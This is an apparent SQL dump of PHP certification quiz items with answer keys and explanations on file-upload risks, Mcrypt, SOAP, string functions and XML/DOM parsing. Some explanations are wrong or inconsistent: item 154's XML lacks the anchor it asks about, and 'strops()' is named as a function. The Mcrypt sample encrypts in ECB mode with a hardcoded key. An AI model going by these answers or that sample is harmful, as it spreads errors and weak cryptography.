	(147,4,'Which of the following are the various ty.....urred in secure file uploads?','','<p><span>Which of the following are the various types of security issues that can be occurred in secure file uploads?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A, B, and C are correct.</span><br /><br /><span>Unsecure file upload is a big security vulnerability. There can be following type of security issues in the secure file uploads:</span></p>\r\n<ul>\r\n<li>User can upload large file and fill the storage device.</li>\r\n<li>User can upload virus which can spread itself.</li>\r\n<li>User can see other users\' uploaded data.</li>\r\n<li>User can upload malicious PHP script and can take control on database and server.</li>\r\n</ul>',0,'2012-11-23 22:59:38','2012-11-23 22:59:38'),
	(148,4,'Which block algorithms does Mcrypt suppor.....gorithms does Mcrypt support?','','<p><span>Which block algorithms does Mcrypt support?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A, B, and C are correct.</span><br /><br /><span>Mcrypt is an interface that supports many block algorithms such as DES, TripleDES, Blowfish (default), 3-WAY, SAFER-SK64, SAFER-SK128, TWOFISH, TEA, RC2 and GOST in CBC, OFB, CFB and ECB cipher modes. The following example explains the working of the mcrypt functions:</span></p>\r\n<p><span><pre><?php\r\n    $key = \"new secret key\";\r\n    $input = \"This is a secret text.\";\r\n    $encrypted_data = mcrypt_ecb (MCRYPT_3DES, $key, $input, MCRYPT_ENCRYPT); //encryption via TRIPLE DES algorithm\r\n?> </pre></span></p>',0,'2012-11-23 23:00:51','2012-11-23 23:00:51'),
	(149,4,'Which of the following directives can be .....e the byte cache performance?','','<p><span>Which of the following directives can be used to enable the byte cache performance?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The apc.enabled directive is used to enable the byte cache performance. The apc.enabled directive can be set to 0 to disable APC. It is used when APC is statically compiled into PHP, since there is no other way to disable it.</span><br /><br /><span>Answer options B, C, and D are incorrect. The auto_append_file is used to enable auto append. cgi.force_redirect enables/disables redirection. The child_terminate directive is used to terminate the child processes.</span><br /><br /><uc:ref>Reference: PHP Manual, Contents: \"cgi.force_redirect\"</uc:ref></p>',0,'2012-11-23 23:01:37','2012-11-23 23:01:37'),
	(150,4,'Which of the following functions is used .....o use the SOAP error handler?','','<p><span>Which of the following functions is used to set whether to use the SOAP error handler?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>There are two important functions in SOAP, which are as follows:</span><br /><br /></p>\r\n<ul>\r\n<li><uc:hed>use_soap_error_handler:</uc:hed>&nbsp;It is used to set whether to use the SOAP error handler.</li>\r\n<li><uc:hed>is_soap_fault:&nbsp;</uc:hed><span>It is used to check if a SOAP call has failed.</span></li>\r\n</ul>\r\n<div><span>The example of the is_soap_fault() functi</span><span>on is as follows:</span></div>\r\n<div><span><pre><?php\r\n    $client = new SoapClient(\"any.wsdl\", array(\'exceptions\' => 0));\r\n    $result = $client->SomeFunction();\r\n    if (is_soap_fault($result)) {\r\n        trigger_error(\"SOAP Fault: (faultcode: {$result->faultcode}, faultstring: {$result->faultstring})\", E_USER_ERROR);\r\n    }\r\n?> </pre></span></div>\r\n<div><span><br /></span></div>\r\n<div><span><span>Reference: PHP Manual, Contents: \"SOAP\"</span></span></div>',0,'2012-11-23 23:03:54','2012-11-23 23:03:54'),
	(151,4,'Which of the following functions can be u.....acters or replace substrings?','','<p><span>Which of the following functions can be used to translate characters or replace substrings?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The strtr() function is used to translate characters or replace substrings. The syntax of the strtr() function is as follows:</span></p>\r\n<p><span><pre>string strtr ( string $str , string $from , string $to ) </pre></span></p>\r\n<p><span><span>Answer option B is incorrect. The substr_compare() function performs binary safe comparison of two strings from an offset, up to length characters.</span><br /><br /><span>Answer option C is incorrect. The substr_count() function counts the number of substring occurrences.</span><br /><br /><span>Answer option D is incorrect. The substr_replace() function replaces text within a portion of a string.</span><br /><br /><uc:ref>Reference: PHP Manual, Contents: \"strtr\"</uc:ref></span></p>',0,'2012-11-23 23:04:56','2012-11-23 23:04:56'),
	(152,4,'Which of the following functions wraps a .....a given number of characters?','','<p><span>Which of the following functions wraps a string to a given number of characters?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The wordwrap() function wraps a string to a given number of characters.</span></p>\r\n<p><span><span>Answer option B is incorrect. The ucwords() function makes uppercase the first character of each word in a string.</span><br /><br /><span>Answer option C is incorrect. The ucfirst() function makes a string\'s first character uppercase.</span><br /><br /><span>Answer option D is incorrect. The trim function is used to strip whitespace (or other characters) from the beginning and end of a string.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/function.wordwrap.php\" tabindex=\"-1\">http://php.net/manual/en/function.wordwrap.php</a></uc:ref></span></p>',0,'2012-11-23 23:05:47','2012-11-23 23:05:47'),
	(153,4,'Which of the following functions will you.....pan>\"!dlrow olleH\"','','<p><span>Which of the following functions will you use to get the following output of string \"Hello world!\"?</span></p>\r\n<p><span><pre>\"!dlrow olleH\"</pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>You will use the strrev() function to get the output as give in the question. The strrev function is used to reverse a string.</span></p>\r\n<p><span><span>Answer option B is incorrect. The strops() function is used to get the position of a string.&nbsp;</span><br /><br /><span>Answer option C is incorrect. The stripos() function works in the same manner as the strops() function. The only difference is that it searches in case-insensitive manner.&nbsp;</span><br /><br /><span>Answer option D is incorrect. The strrchr() function is used to find the last occurrence of a character in a string.</span><br /><br /><uc:ref>Reference: PHP Manual, Contents: \"String Functions\"</uc:ref></span></p>',0,'2012-11-23 23:07:05','2012-11-23 23:07:05'),
	(154,5,'Consider the following XML file:','','<p><span>Consider the following XML file:</span></p>\r\n<p><span><pre><?xml version=\"1.0\" encoding=\"ISO-8859-1\" ?>   \r\n <!DOCTYPE html   \r\n      PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"   \r\n      \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">   \r\n <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\">   \r\n   <head>   \r\n     <title> SimpleXML Example</title>   \r\n   </head>   \r\n   <body>   \r\n     <h1>   \r\n    <br/>   \r\n     </h1>   \r\n   </body>   \r\n </html> </pre></span></p>\r\n<p><span><span>Which of the following statements will display the HREF attribute on the anchor tag if the SimpleXML object is $sxml?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>In the script given in the question, HREF is the attribute of the anchor (&lt;a&gt;) tag. Besides this, anchor tag is inside the &lt;h1&gt; tag and &lt;body&gt; tag. Hence, you will access the HREF tag in the following way:</span></p>\r\n<p><span><pre>$sxml->body->h1->a[\'href\']</pre></span></p>\r\n<p><span><span>SimpleXML is a PHP extension that allows users to easily manipulate/use XML data. Its functions let a user convert XML to an object, which can be processed with property selectors and array iterators. Consider the following XML file, which describes a small collection of books in XML format. It has a root node of store having a direct child, i.e., category, which classifies the books as fiction; category has two children() labelled book; \"twilight\" by Stephinie Mayer and \"The Bikers\" by Alex R. Stuart.</span></span></p>\r\n<p><span><span><pre><?xml version=\"1.0\"?>\r\n  <store>\r\n     <category id=\"fiction\">\r\n          <book>\r\n              <title>twilight</title>\r\n              <author>Stephinie Mayer</author>\r\n          </book>\r\n          <book>\r\n              <title>The Bikers</title>\r\n              <author>Alex R. Stuart</author>\r\n          </book>\r\n      </category>\r\n  </store></pre></span></span></p>\r\n<p><span><span><span>To extract the book title and author, a user will run the following PHP script:</span></span></span></p>\r\n<p><span><span><span><pre><?php\r\n     $store = simplexml_load_file(\'store.xml\');\r\n        foreach ($store->category as $category) {\r\n            printf(\"Category %s\\n\", $category[\'id\']);\r\n               foreach ($category->book as $book) {\r\n                   printf(\"<br>Title: %s\\n\", $book->title);\r\n                   printf(\"<br>Author: %s\\n\", $book->author);\r\n            }\r\n     }\r\n  ?> </pre></span></span></span></p>\r\n<p><span><span><span><span>Here, the simplexml_load_file() function will convert the XML document of the store.xml file to an object.</span></span></span></span></p>',0,'2012-11-24 12:18:12','2012-11-24 12:18:12'),
	(155,5,'You have given the following XML data in .....pt is executed?','','<p><span>You have given the following XML data in the tasks.XML file:</span></p>\r\n<p><span><pre><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n <tasklist>\r\n       <note>\r\n          <tasks>Validate data</tasks>\r\n          <details>String Validation</details>\r\n       </note>\r\n       <note>\r\n          <tasks>Secure data</tasks>\r\n          <details>Encryption</details>\r\n       </note>\r\n </tasklist> </pre></span></p>\r\n<p><span><span>Now, you run the following PHP script:</span></span></p>\r\n<p><span><span><pre><?php\r\n   $objDOM = new DOMDocument();\r\n   $objDOM->load(\"tasks.xml\"); \r\n   $note = $objDOM->getElementsByTagName(\"note\");\r\n   foreach( $note as $value )\r\n   {\r\n        $tasks = $value->getElementsByTagName(\"tasks\");\r\n        $task  = $tasks->item(0)->nodeValue;\r\n        $details = $value->getElementsByTagName(\"details\");\r\n        $detail  = $details->item(0)->nodeValue;\r\n        echo \"$task :: $detail <br>\";\r\n   }\r\n ?> </pre></span></span></p>\r\n<p><span><span><span>What should be displayed when this script is executed?</span></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The PHP script will print the contents of every tasks and details nodes. The detailed explanation of the PHP script is as follows:</span></p>\r\n<p><span><pre><?\r\n   $objDOM = new DOMDocument();\r\n   $objDOM->load(\"tasks.xml\"); //Loads the XML data into DOM object\r\n   $note = $objDOM->getElementsByTagName(\"note\"); // Gets elements by <note>\r\n   // for each note tag, parse the document and get values for tasks and details tag.\r\n   foreach( $note as $value )\r\n   {\r\n        $tasks = $value->getElementsByTagName(\"tasks\");\r\n        $task  = $tasks->item(0)->nodeValue; // nodeValue is the value of this node.\r\n        $details = $value->getElementsByTagName(\"details\");\r\n        $detail  = $details->item(0)->nodeValue;\r\n        echo \"$task :: $detail <br>\";\r\n   }\r\n ?>  </pre></span></p>',0,'2012-11-24 12:20:01','2012-11-24 12:20:01'),
	(156,5,'What will be the output of the following .....t();\r\nprint_r($a);\r\n?> ','','<p><span>What will be the output of the following PHP script?</span></p>\r\n<p><span><pre><?php\r\n$dom = new DOMDocument();\r\n$dom->load(\'book.xml\');\r\n$a = $dom->document_element();\r\nprint_r($a);\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>The dom-&gt;document_element() function is used to retrieve the root element from an XML file. For example, consider a user runs the following script:</span></p>\r\n<p><span></span><pre><?php\r\n$dom = new DOMDocument();\r\n$dom->load(\'book.xml\');\r\n \r\n$a = $dom->document_element();\r\nprint_r($a);\r\n?> </pre></p>',0,'2012-11-24 12:21:23','2012-11-24 12:21:23'),
	(157,5,'Given a table created as shown below:','','<p><span>Given a table created as shown below:</span></p>\r\n<p><span><pre>create table foo (c1 int, c2 int, c3 int, c4 char(10)) </pre></span></p>\r\n<p><span><span>If column c1 has a cardinality of 10, column c2 has a cardinality of 5000, and column c3 has a cardinality of 5000000, which of the following indexes would optimize the following statement?</span></span></p>\r\n<p><span><span><pre>Select c1,c2,c3 from foo where c1=100 and c2= 100 and c3 = 100</pre></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.&nbsp;</span><br /><br /><span>It is important to create indexes by columns ordered on most frequently used columns in joins first and highest cardinality columns first. In this case the query is not a join, so if we base the order of the columns in the index on cardinality, we would want to create the index as (c3,c2,c1).&nbsp;</span><br /><br /><span>Since the cardinality of c3 is so much higher than the other two columns, the order of those two remaining columns is not as vital, so if we created the index as (c3,c1,c2), there would not be much difference in performance, but the order (c3,c2,c1) is the optimal query.</span></p>\r\n<p><span><span>In SQL (Structured Query Language), the term cardinality refers to the uniqueness of data values contained in a particular column (attribute) of a database table. The lower the cardinality, the more duplicated elements in a column. Thus, a column with the lowest possible cardinality would have the same value for every row. SQL databases use cardinality to help determine the optimal query plan for a given query.</span></span></p>',0,'2012-11-24 12:22:54','2012-11-24 12:22:54'),
	(158,5,'You run the following PHP script:','','<p><span>You run the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n include(\"xml.inc\");\r\n \r\n if (!$dom = domxml_open_mem($xmlstr)) {\r\n   echo \"Error while parsing the XML document\\n\";\r\n   exit;\r\n }\r\n \r\n $a = **********\r\n print_r($a);\r\n ?> </pre></span></p>\r\n<p><span><span>Which of the following functions will you use instead of * if you want to print the root element of the XML file?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The dom-&gt;document_element() function is used to retrieve the root element from an XML file. For example, consider a user runs the following script:</span></p>\r\n<p><span><pre><?php\r\n include(\"xml.inc\");\r\n \r\n if (!$dom = domxml_open_mem($xmlstr)) {\r\n   echo \"Error while parsing the XML document\\n\";\r\n   exit;\r\n }\r\n \r\n $a = $dom->document_element();\r\n print_r($a);\r\n ?> </pre></span></p>\r\n<p><span><span>The output will be the root element of the XML file.</span><br /><br /><span>Answer option C is incorrect. The node-&gt;parent_node() function returns the parent node.&nbsp;</span><br /><br /><span>Answer options B and D are incorrect. These are not valid DOM XML functions.</span></span></p>',0,'2012-11-24 12:24:43','2012-11-24 12:24:43'),
	(159,5,'Fill in the Blank with the appropriate me.....XML objects for use with DOM.','','<p><span>Fill in the Blank with the appropriate method name.</span></p>\r\n<p><span>The <span face=\"Lucida Grande\" style=\"font-family: \'Lucida Grande\';\"><span style=\"font-size: 11px;\">__________________</span></span>&nbsp;is used to import the SimpleXML objects for use with DOM.</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer C is correct. The dom_import_simplexml() is used to import the SimpleXML objects for use with DOM. The following code segment explains the working of this method:</span></p>\r\n<p><span><pre> $sxml = simplexml_load_file(\'library.xml\');\r\n $node = dom_import_simplexml($sxml);\r\n $dom = new DomDocument();\r\n $dom-> importNode($node, true);\r\n $dom-> appendChild($node);</pre></span></p>',0,'2012-11-24 12:27:36','2012-11-24 12:27:36'),
	(160,5,'Which of the following functions can you .....ons can you use to move data?','','<p><span>Which of the following functions can you use to move data?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>A user cannot move a data directly in DOM but can use the DomNode::appendChild() and DomNode::insertBefore() functions for moving data. For example:</span></p>\r\n<p><span></span><pre> $dom = new DOMDocument();\r\n $dom->load(\"library.xml\");\r\n $xpath = new DomXPath($dom);\r\n $xpath->registerNamespace(\"lib\", \"http://example.org/library\");\r\n $result = $xpath->query(\"//lib:book\");\r\n $result->item(1)->parentNode->insertBefore($result->item(1), $result->item(0));</pre></p>\r\n<p><span>Here, you are taking the second book element and placing it before the 1\'rst book.</span></p>',0,'2012-11-24 12:29:18','2012-11-24 12:29:18'),
	(161,5,'Which of the following functions will you.....reate new DomElement objects?','','<p><span>Which of the following functions will you use to create new DomElement objects?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A, B, and C are correct.</span><br /><br /><span>The DomDocument::createElement(), DomDocument::createElementNS(), and DomDocument::createTextNode() are used to create element, create element namespace, and create text node respectively.</span><br /><br /><span>Answer option D is incorrect. The DomNode::cloneNode() is used to duplicate a node.</span></p>',0,'2012-11-24 12:30:29','2012-11-24 12:30:29'),
	(162,5,'You have been given the following PHP scr...... please Fix it.','','<p><span>You have been given the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$xmlstring = <<<XML \r\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> \r\n<email> \r\n<to>jenny@php.com</to> \r\n<from>john@php.com</from>\r\n<heading>Technical issue in Linux OS</heading>\r\n<body>There is a technical issue in my Linux system. Please Fix it. </body>\r\n</email>\r\nXML;\r\n$xml = new SimpleXMLElement($xmlstring);\r\nforeach($xml->children() as $child)\r\n  {\r\n<Insert code here.>\r\n  }\r\n ?></pre></span></p>\r\n<p><span><span>Which of the following code snippets will you insert at line number 12 to get the following output?</span></span></p>\r\n<p><span><span><pre>to: jenny@php.com\r\n from: john@php.com\r\n heading: Technical issue in Linux OS\r\n body: There is a technical issue in my Linux system. please Fix it.</pre></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>You will place the following code snippet to get the appropriate output:</span></p>\r\n<p><span><pre>echo $child->getName() . \": \" . $child . \"<br />\";</pre></span></p>\r\n<p><span><span>The getName() function is used to retrieve the name of an XML element from a SimpleXMLElement object. When it is successfully executed, it returns the name of the current XML element. The syntax of this function is as follows:</span></span></p>\r\n<p><span><span><pre>class SimpleXMLElement\r\n{\r\n   string getName()\r\n}</pre></span></span></p>\r\n<p><span><span><span>Answer option B is incorrect. The getNamespaces() function is used to retrieve the namespaces used in an XML document from a SimpleXMLElement object. When this function is successfully executed, it returns an array of the namespaces in an XML document. The syntax of the getNamespaces() function is as follows:</span></span></span></p>\r\n<p><span><span><span><pre>class SimpleXMLElement\r\n{\r\n   string getNamespaces([  bool $recursive  ] )\r\n}</pre></span></span></span></p>\r\n<p><span><span><span><span>where&nbsp;</span><uc:hed>recursive</uc:hed><span>&nbsp;is an optional parameter. If it is specified, it returns all namespaces used in parent and child nodes. Otherwise, it returns only namespaces used in the root node. By default, it is false.</span><br /><br /><span>Answer option C is incorrect. The getDocNamespaces() function is used to retrieve the namespaces declared in an XML document from a SimpleXMLElement object. When this function successfully executes, it returns an array of the namespaces in an XML document. The syntax of the getDocNamespaces() function is as follows:</span></span></span></span></p>\r\n<p><span><span><span><span><pre>class SimpleXMLElement\r\n{\r\n   string getDocNamespaces(recursive)\r\n} </pre></span></span></span></span></p>\r\n<p><span><span><span><span><span>where&nbsp;</span><uc:hed>recursive</uc:hed><span>&nbsp;is an optional parameter. If it is specified, it returns all namespaces used in parent and child nodes. Otherwise, it returns only namespaces used in the root node. By default, it is set to false.</span><br /><br /><span>Answer option D is incorrect. The asXML() function returns an XML string based on SimpleXML element. The syntax of the asXML function is as follows:</span></span></span></span></span></p>\r\n<p><span><span><span><span><span><pre>class SimpleXMLElement\r\n{\r\nstring asXML(file)\r\n} </pre></span></span></span></span></span></p>\r\n<p><span><span><span><span><span><span>where, when the file option is given, the asXML() function writes the string in a file instead of returning it.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.w3schools.com/php/php_ref_simplexml.asp\" tabindex=\"-1\">http://www.w3schools.com/php/php_ref_simplexml.asp</a></uc:ref></span></span></span></span></span></p>',0,'2012-11-24 12:34:07','2012-11-24 12:34:07'),
	(163,5,'Which of the following functions in Simpl.....subnodes of the current node?','','<p><span>Which of the following functions in SimpleXML can be used to return an iterator containing a list of all subnodes of the current node?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The children() function retrieves the child nodes of a specified XML node. It can be used to return an iterator containing a list of all subnodes of the current node. The syntax of the children() function is as follows:</span></p>\r\n<p><span><pre>class SimpleXMLElement\r\n{\r\n  string children(ns, is_prefix)\r\n}</pre></span></p>\r\n<p><span><span>where, ns is an XML namespace and is_prefix is a Boolean value that becomes TRUE if ns is regarded as a prefix.</span><br /><br /><span>Answer option B is incorrect. The asXML() function returns an XML string based on SimpleXML element. The syntax of the asXML function is as follows:</span></span></p>\r\n<p><span><span><pre>class SimpleXMLElement\r\n{\r\n  string asXML(file)\r\n} </pre></span></span></p>\r\n<p><span><span><span>where, when the file option is given, the asXML() function writes the string in a file instead of returning it.&nbsp;</span><br /><br /><span>Answer option C is incorrect. The getName() function is used to retrieve the name of an XML element from a SimpleXMLElement object. When it is successfully executed, it returns the name of the current XML element. The syntax of this function is as follows:</span></span></span></p>\r\n<p><span><span><span><pre>class SimpleXMLElement\r\n{\r\n   string getName()\r\n}</pre></span></span></span></p>\r\n<div class=\"clearfix\">Answer option D is incorrect. The attributes() function is used to retrieve an XML elements attributes.<br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.w3schools.com/php/php_ref_simplexml.asp\" tabindex=\"-1\">http://www.w3schools.com/php/php_ref_simplexml.asp</a></uc:ref></div>\r\n<p><span><span><span><br /></span></span></span></p>',0,'2012-11-24 12:36:00','2012-11-24 12:36:00'),
	(164,5,'Which of the following functions sets up .....art and end element handlers?','','<p><span>Which of the following functions sets up start and end element handlers?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The xml_set_element_handler() function is used to set up start and end element handlers. It is mainly used to specify functions to be called at the start and end of an element in the XML document. The syntax of the xml_set_element_handler() function is as follows:</span></p>\r\n<p><span><pre>xml_set_element_handler(parser,start,end) </pre></span></p>\r\n<p><span><span>where, parser specifies XML parser to use, start specifies the function to be called at the start of an element, and end specifies the function to be called at the end of an element.</span><br /><br /><span>Answer option B is incorrect. The xml_set_object() function is used to allow a parser to be used within an object. It uses the XML Parser within an object. The syntax of the xml_set_object() function is as follows:</span></span></p>\r\n<p><span><span><pre>bool xml_set_object(resource $parser,  object &$object) </pre></span></span></p>\r\n<p><span><span><span>where, $parser specifies XML parser to use and $object is an object in which $parser is to be used.</span><br /><br /><span>Answer option C is incorrect. The xml_parse_into_struct() function is used to parse XML data into an array structure. It parses the XML data into two arrays, i.e., value array that contains the data from the parsed XML and index array that contains pointers to the location of the values in the value array. The syntax of the xml_parse_into_struct() function is as follows:</span></span></span></p>\r\n<p><span><span><span><pre>xml_parse_into_struct(parser,xml,value_arr,index_arr) </pre></span></span></span></p>\r\n<p><span><span><span><span>where, parser specifies the XML parser to use. XML is an XML data to parse. The value_arr and index_arr are the arrays specifying the target array and the index array for index data respectively.</span><br /><br /><span>Answer option D is incorrect. The xml_parser_create_ns() function is used to create an XML parser with namespace support. It returns a referencing resource handle to be used by other XML functions. The syntax of the xml_parser_create_ns() function is as follows:</span></span></span></span></p>\r\n<p><span><span><span><span><pre>resource xml_parser_create_ns  ([  string $encoding  [,  string $separator = \':\'  ]])</pre></span></span></span></span></p>\r\n<p><span><span><span><span><span>where, $encoding is an optional parameter in PHP5 since it is automatically detected. The $separator is a variable that specifies the output separator for tag name and namespace.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://uk.php.net/manual/en/ref.xml.php\" tabindex=\"-1\">http://uk.php.net/manual/en/ref.xml.php</a></uc:ref></span></span></span></span></p>',0,'2012-11-24 12:38:49','2012-11-24 12:38:49'),
	(165,5,'All of the following are the pre-defined .....ntities except for which one?','','<p><span>All of the following are the pre-defined entities except for which one?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>An entity reference is a placeholder that represents that entity. It consists of the entity\'s name preceded by an ampersand (\"&amp;\") and followed by a semicolon (\";\"). XML has five pre-declared entities:</span></p>\r\n<ul>\r\n<li>&amp; (&amp; or \"ampersand\")</li>\r\n<li>&lt; (&lt; or \"less than\")</li>\r\n<li>&gt; (&gt; or \"greater than\")</li>\r\n<li>\' (\' or \"apostrophe\")</li>\r\n<li>\" (\" or \"quotation mark\")</li>\r\n</ul>\r\n<p><span>Here is an example using a pre-declared XML entity to represent the ampersand in the name \"AT&amp;T\":</span></p>\r\n<p><span><pre><company_name>AT&T</company_name> </pre></span></p>',0,'2012-11-24 12:40:17','2012-11-24 12:40:17'),
	(166,5,'Which function is used to set up start an.....art and end element handlers?','','<p><span>Which function is used to set up start and end element handlers?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The xml_set_element_handler() function is used to set up start and end element handlers. It is mainly used to specify functions to be called at the start and end of an element in the XML document. The syntax of the xml_set_element_handler() function is as follows:</span></p>\r\n<p><span><pre>xml_set_element_handler(parser,start,end) </pre></span></p>\r\n<p><span><span>where, parser specifies XML parser to use, start specifies the function to be called at the start of an element, and end specifies the function to be called at the end of an element.</span></span></p>',0,'2012-11-24 12:41:23','2012-11-24 12:41:23'),
	(167,5,'Which function is used to allow a parser ..... to be used within an object?','','<p><span>Which function is used to allow a parser to be used within an object?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The xml_set_object() function is used to allow a parser to be used within an object. It uses the XML Parser within an object. The syntax of the xml_set_object() function is as follows:</span></p>\r\n<p><span><pre>bool xml_set_object(resource $parser,  object &$object) </pre></span></p>\r\n<p><span><span>where, $parser specifies XML parser to use and $object is an object in which $parser is to be used.</span></span></p>',0,'2012-11-24 12:42:30','2012-11-24 12:42:30'),
	(168,5,'Which of the following function is used t.....data into an array structure?','','<p><span>Which of the following function is used to parse XML data into an array structure?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The xml_parse_into_struct() function is used to parse XML data into an array structure. It parses the XML data into two arrays, i.e., value array that contains the data from the parsed XML and index array that contains pointers to the location of the values in the value array. The syntax of the xml_parse_into_struct() function is as follows:</span></p>\r\n<p><span><pre>xml_parse_into_struct(parser,xml,value_arr,index_arr) </pre></span></p>\r\n<div class=\"clearfix\">where, parser specifies the XML parser to use. XML is an XML data to parse. The value_arr and index_arr are the arrays specifying the target array and the index array for index data respectively.</div>\r\n<p><span><br /></span></p>',0,'2012-11-24 12:43:41','2012-11-24 12:43:41'),
	(169,5,'Which of the following is used to create .....arser with namespace support?','','<p><span>Which of the following is used to create an XML parser with namespace support?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The xml_parser_create_ns() function is used to create an XML parser with namespace support. It returns a referencing resource handle to be used by other XML functions. The syntax of the xml_parser_create_ns() function is as follows:</span></p>\r\n<p><span><pre>resource xml_parser_create_ns  ([  string $encoding  [,  string $separator = \':\'  ]])</pre></span></p>\r\n<p><span><span>where, $encoding is an optional parameter in PHP5 since it is automatically detected. The $separator is a variable that specifies the output separator for tag name and namespace.</span></span></p>',0,'2012-11-24 12:45:23','2012-11-24 12:45:23'),
	(170,5,'Which of the following functions returns .....g based on SimpleXML element?','','<p><span>Which of the following functions returns an XML string based on SimpleXML element?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><br /><span>The asXML() function returns an XML string based on SimpleXML element. The syntax of the asXML function is as follows:</span></p>\r\n<p><span><pre>class SimpleXMLElement\r\n{\r\n  string asXML(file)\r\n} </pre></span></p>\r\n<p><span><span>where, when the file option is given, the asXML() function writes the string in a file instead of returning it.</span></span></p>',0,'2012-11-24 12:46:43','2012-11-24 12:46:43'),
	(171,5,'Which of the following is used to retriev.....oot element from an XML file?','','<p><span>Which of the following is used to retrieve the root element from an XML file?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><br /><span>The dom-&gt;document_element() function is used to retrieve the root element from an XML file. For example, consider a user runs the following script:</span></p>\r\n<p><span><pre><?php\r\n$dom = new DOMDocument();\r\n$dom->load(\'book.xml\');\r\n \r\n$a = $dom->document_element();\r\nprint_r($a);\r\n?> </pre></span></p>\r\n<p><span><br /></span></p>',0,'2012-11-24 12:48:15','2012-11-24 12:48:15'),
	(172,5,'Which of the following retrieves the chil.....odes of a specified XML node?','','<p><span>Which of the following retrieves the child nodes of a specified XML node?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><br /><span>The children() function retrieves the child nodes of a specified XML node. It can be used to return an iterator containing a list of all subnodes of the current node. The syntax of the children() function is as follows:</span></p>\r\n<p><span><pre>class SimpleXMLElement\r\n{\r\n  string children(ns, is_prefix)\r\n}</pre></span></p>\r\n<p><span><span>where, ns is an XML namespace and is_prefix is a Boolean value that becomes TRUE if ns is regarded as a prefix.</span></span></p>',0,'2012-11-24 12:49:22','2012-11-24 12:49:22'),
	(173,5,'Which of the following is used to retriev.....om a SimpleXMLElement object?','','<p><span>Which of the following is used to retrieve the name of an XML element from a SimpleXMLElement object?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The getName() function is used to retrieve the name of an XML element from a SimpleXMLElement object. When it is successfully executed, it returns the name of the current XML element. The syntax of this function is as follows:</span></p>\r\n<p><span><pre>class SimpleXMLElement\r\n{\r\n   string getName()\r\n}</pre></span></p>',0,'2012-11-24 12:50:16','2012-11-24 12:50:16'),
	(174,5,'Which of the following is used to retriev.....om a SimpleXMLElement object?','','<p><span>Which of the following is used to retrieve the namespaces used in an XML document from a SimpleXMLElement object?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><br /><span>The getNamespaces() function is used to retrieve the namespaces used in an XML document from a SimpleXMLElement object. When this function is successfully executed, it returns an array of the namespaces in an XML document. The syntax of the getNamespaces() function is as follows:</span></p>\r\n<p><span><pre>class SimpleXMLElement\r\n{\r\n   string getNamespaces([  bool $recursive  ] )\r\n}</pre></span></p>\r\n<p><span><span>where&nbsp;</span><uc:hed>recursive</uc:hed><span>&nbsp;is an optional parameter. If it is specified, it returns all namespaces used in parent and child nodes. Otherwise, it returns only namespaces used in the root node. By default, it is false.</span></span></p>',0,'2012-11-24 12:51:37','2012-11-24 12:51:37'),
